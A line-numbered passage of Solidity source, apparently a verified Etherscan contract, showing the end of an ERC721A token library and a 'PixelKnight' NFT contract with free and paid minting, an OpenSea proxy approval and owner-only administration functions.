1091         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1092         unchecked {
1093             _addressData[to].balance += uint64(quantity);
1094             _addressData[to].numberMinted += uint64(quantity);
1095 
1096             _ownerships[startTokenId].addr = to;
1097             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1098 
1099             uint256 updatedIndex = startTokenId;
1100             uint256 end = updatedIndex + quantity;
1101 
1102             if (safe && to.isContract()) {
1103                 do {
1104                     emit Transfer(address(0), to, updatedIndex);
1105                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1106                         revert TransferToNonERC721ReceiverImplementer();
1107                     }
1108                 } while (updatedIndex != end);
1109                 // Reentrancy protection
1110                 if (_currentIndex != startTokenId) revert();
1111             } else {
1112                 do {
1113                     emit Transfer(address(0), to, updatedIndex++);
1114                 } while (updatedIndex != end);
1115             }
1116             _currentIndex = updatedIndex;
1117         }
1118         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1119     }
1120 
1121     /**
1122      * @dev Transfers `tokenId` from `from` to `to`.
1123      *
1124      * Requirements:
1125      *
1126      * - `to` cannot be the zero address.
1127      * - `tokenId` token must be owned by `from`.
1128      *
1129      * Emits a {Transfer} event.
1130      */
1131     function _transfer(
1132         address from,
1133         address to,
1134         uint256 tokenId
1135     ) private {
1136         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1137 
1138         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1139             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1140             getApproved(tokenId) == _msgSender());
1141 
1142         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1143         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1144         if (to == address(0)) revert TransferToZeroAddress();
1145 
1146         _beforeTokenTransfers(from, to, tokenId, 1);
1147 
1148         // Clear approvals from the previous owner
1149         _approve(address(0), tokenId, prevOwnership.addr);
1150 
1151         // Underflow of the sender's balance is impossible because we check for
1152         // ownership above and the recipient's balance can't realistically overflow.
1153         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1154         unchecked {
1155             _addressData[from].balance -= 1;
1156             _addressData[to].balance += 1;
1157 
1158             _ownerships[tokenId].addr = to;
1159             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1160 
1161             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1162             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1163             uint256 nextTokenId = tokenId + 1;
1164             if (_ownerships[nextTokenId].addr == address(0)) {
1165                 // This will suffice for checking _exists(nextTokenId),
1166                 // as a burned slot cannot contain the zero address.
1167                 if (nextTokenId < _currentIndex) {
1168                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1169                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1170                 }
1171             }
1172         }
1173 
1174         emit Transfer(from, to, tokenId);
1175         _afterTokenTransfers(from, to, tokenId, 1);
1176     }
1177 
1178     /**
1179      * @dev Destroys `tokenId`.
1180      * The approval is cleared when the token is burned.
1181      *
1182      * Requirements:
1183      *
1184      * - `tokenId` must exist.
1185      *
1186      * Emits a {Transfer} event.
1187      */
1188     function _burn(uint256 tokenId) internal virtual {
1189         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1190 
1191         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1192 
1193         // Clear approvals from the previous owner
1194         _approve(address(0), tokenId, prevOwnership.addr);
1195 
1196         // Underflow of the sender's balance is impossible because we check for
1197         // ownership above and the recipient's balance can't realistically overflow.
1198         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1199         unchecked {
1200             _addressData[prevOwnership.addr].balance -= 1;
1201             _addressData[prevOwnership.addr].numberBurned += 1;
1202 
1203             // Keep track of who burned the token, and the timestamp of burning.
1204             _ownerships[tokenId].addr = prevOwnership.addr;
1205             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1206             _ownerships[tokenId].burned = true;
1207 
1208             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1209             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1210             uint256 nextTokenId = tokenId + 1;
1211             if (_ownerships[nextTokenId].addr == address(0)) {
1212                 // This will suffice for checking _exists(nextTokenId),
1213                 // as a burned slot cannot contain the zero address.
1214                 if (nextTokenId < _currentIndex) {
1215                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1216                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1217                 }
1218             }
1219         }
1220 
1221         emit Transfer(prevOwnership.addr, address(0), tokenId);
1222         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1223 
1224         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1225         unchecked {
1226             _burnCounter++;
1227         }
1228     }
1229 
1230     /**
1231      * @dev Approve `to` to operate on `tokenId`
1232      *
1233      * Emits a {Approval} event.
1234      */
1235     function _approve(
1236         address to,
1237         uint256 tokenId,
1238         address owner
1239     ) private {
1240         _tokenApprovals[tokenId] = to;
1241         emit Approval(owner, to, tokenId);
1242     }
1243 
1244     /**
1245      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1246      *
1247      * @param from address representing the previous owner of the given token ID
1248      * @param to target address that will receive the tokens
1249      * @param tokenId uint256 ID of the token to be transferred
1250      * @param _data bytes optional data to send along with the call
1251      * @return bool whether the call correctly returned the expected magic value
1252      */
1253     function _checkContractOnERC721Received(
1254         address from,
1255         address to,
1256         uint256 tokenId,
1257         bytes memory _data
1258     ) private returns (bool) {
1259         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1260             return retval == IERC721Receiver(to).onERC721Received.selector;
1261         } catch (bytes memory reason) {
1262             if (reason.length == 0) {
1263                 revert TransferToNonERC721ReceiverImplementer();
1264             } else {
1265                 assembly {
1266                     revert(add(32, reason), mload(reason))
1267                 }
1268             }
1269         }
1270     }
1271 
1272     /**
1273      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1274      * And also called before burning one token.
1275      *
1276      * startTokenId - the first token id to be transferred
1277      * quantity - the amount to be transferred
1278      *
1279      * Calling conditions:
1280      *
1281      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1282      * transferred to `to`.
1283      * - When `from` is zero, `tokenId` will be minted for `to`.
1284      * - When `to` is zero, `tokenId` will be burned by `from`.
1285      * - `from` and `to` are never both zero.
1286      */
1287     function _beforeTokenTransfers(
1288         address from,
1289         address to,
1290         uint256 startTokenId,
1291         uint256 quantity
1292     ) internal virtual {}
1293 
1294     /**
1295      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1296      * minting.
1297      * And also called after one token has been burned.
1298      *
1299      * startTokenId - the first token id to be transferred
1300      * quantity - the amount to be transferred
1301      *
1302      * Calling conditions:
1303      *
1304      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1305      * transferred to `to`.
1306      * - When `from` is zero, `tokenId` has been minted for `to`.
1307      * - When `to` is zero, `tokenId` has been burned by `from`.
1308      * - `from` and `to` are never both zero.
1309      */
1310     function _afterTokenTransfers(
1311         address from,
1312         address to,
1313         uint256 startTokenId,
1314         uint256 quantity
1315     ) internal virtual {}
1316 }
1317 
1318 /**
1319   Submitted for verification at Etherscan.io on 2022-07-09
1320 */
1321 
1322 contract PixelKnight is ERC721A, Owneable {
1323     
1324     uint256 public constant MAX_PER_TX = 3;
1325     uint256 public constant MAX_FREE_SUPPLY = 2000;
1326     uint256 public constant MAX_SUPPLY = 5000;
1327 
1328     uint256 public price = 0.007 ether;
1329     string public baseURI = "https://pixelknight.mypinata.cloud/ipfs/QmbKtznEWkH7zuYSNrVRYedUNcRSgXd4jV8sfp8AjzVqRn/";
1330     
1331     string public constant baseExtension = ".json";
1332     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1333 
1334     bool public paused = true;
1335 
1336     constructor() ERC721A("PixelKnight", "PK") {} 
1337 
1338     function mint(uint256 _amount) external payable {
1339         require(!paused, "Mint paused");
1340         
1341         require(totalSupply() + _amount <= MAX_SUPPLY, "Exceed max supply");
1342         require(_amount > 0, "Invalid mint amount");
1343         require(tx.origin == msg.sender, "No contract mint");
1344         require(_amount <= MAX_PER_TX, "Exceed max per tx");
1345 
1346         if (totalSupply() + _amount > MAX_FREE_SUPPLY) {
1347             require(_amount * price == msg.value, "Invalid funds provided");
1348         }
1349 
1350         _safeMint(msg.sender, _amount);
1351     }
1352 
1353     function isApprovedForAll(address owner, address operator)
1354         override
1355         public
1356         view
1357         returns (bool)
1358     {
1359         // Whitelist OpenSea proxy contract for easy trading.
1360         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1361         if (address(proxyRegistry.proxies(owner)) == operator) {
1362             return true;
1363         }
1364 
1365         return super.isApprovedForAll(owner, operator);
1366     }
1367 
1368     function devMint(address _to, uint _amount) external onlyOwner {
1369         require(totalSupply() + _amount <= MAX_SUPPLY, "Exceed max supply");
1370         _safeMint(_to, _amount);
1371     }
1372 
1373     function pause(bool _state) external onlyOwner {
1374         paused = _state;
1375     }
1376 
1377     function setBaseURI(string memory baseURI_) external onlyOwner {
1378         baseURI = baseURI_;
1379     }
1380 
1381     function setPrice(uint256 newPrice) public onlyOwner {
1382         price = newPrice;
1383     }
1384 
1385     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1386         require(_exists(_tokenId), "Token does not exist.");
1387         return bytes(baseURI).length > 0 ? string(
1388             abi.encodePacked(
1389               baseURI,
1390               Strings.toString(_tokenId),
1391               baseExtension
1392             )
1393         ) : "";
1394     }
1395 
1396     function _startTokenId() internal pure override returns (uint256) {
1397         return 1;
1398     }
1399 
1400     function withdraw() external onlyOwner {
1401         uint256 balance = address(this).balance;
1402         (bool success, ) = _msgSender().call{value: balance}("");
1403         require(success, "Failed to send");
1404     }
1405 }
1406 
1407 contract OwnableDelegateProxy {}
1408 contract ProxyRegistry {
1409     mapping(address => OwnableDelegateProxy) public proxies;
1410 }